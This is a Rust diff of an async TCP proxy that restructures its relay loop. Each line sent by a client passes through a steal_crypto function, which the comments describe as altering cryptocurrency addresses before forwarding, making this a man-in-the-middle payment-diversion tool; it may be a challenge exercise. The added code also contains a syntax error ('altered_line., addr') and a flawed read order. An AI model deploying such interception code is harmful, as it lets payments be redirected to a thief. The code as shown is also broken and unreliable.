@@ -60,45 +60,30 @@ async fn process(to_client_stream: TcpStream, addr: SocketAddr) -> Result<()> {
     let (client_reader, mut client_writer) = tokio::io::split(to_client_stream);
     let mut client_reader = io::BufReader::new(client_reader);
 
-    tokio::spawn(async move {
-        loop {
-            let n = client_reader
-                .read_line(&mut line_from_client)
-                .await
-                .expect("Unable to read from client");
+    loop {
+        // whatever we get from the server...
+        let _: usize = server_reader.read_line(&mut line_from_server).await?;
+        info!("From server: {}", line_from_server);
 
-            if n == 0 {
-                break;
-            }
-            // try to steal some crypto
-            let altered_line = steal_crypto(&line_from_client);
-            // and then we pass the altered line
-            server_writer
-                .write_all(altered_line.as_bytes())
-                .await
-                .expect("Unable to send to server");
+        //... we send back to client
+        client_writer.write_all(line_from_server.as_bytes()).await?;
+
+        // but what we get from the client...
+        let bytes_from_client = client_reader.read_line(&mut line_from_client).await?;
+        info!("From {}: {}", addr, line_from_client);
+
+        // ...we check if we can alter the crypto address
+        let altered_line = steal_crypto(&line_from_client);
+        info!("Sending {} to server from {}", altered_line., addr);
+
+        // and then we pass the altered line
+        server_writer.write_all(altered_line.as_bytes()).await?;
+
+        // Nothing more to read, let's bail
+        if bytes_from_client == 0 {
+            break;
         }
-
-        loop {
-            // whatever we get from the server...
-            let n: usize = server_reader
-                .read_line(&mut line_from_server)
-                .await
-                .expect("Unable to read from server");
-            info!("From server: {}", line_from_server);
-
-            if n == 0 {
-                break;
-            }
-
-            //... we send back to client
-            client_writer
-                .write_all(line_from_server.as_bytes())
-                .await
-                .expect("Unable to send back to client");
-        }
-    });
-
+    }
     Ok(())
 }
 
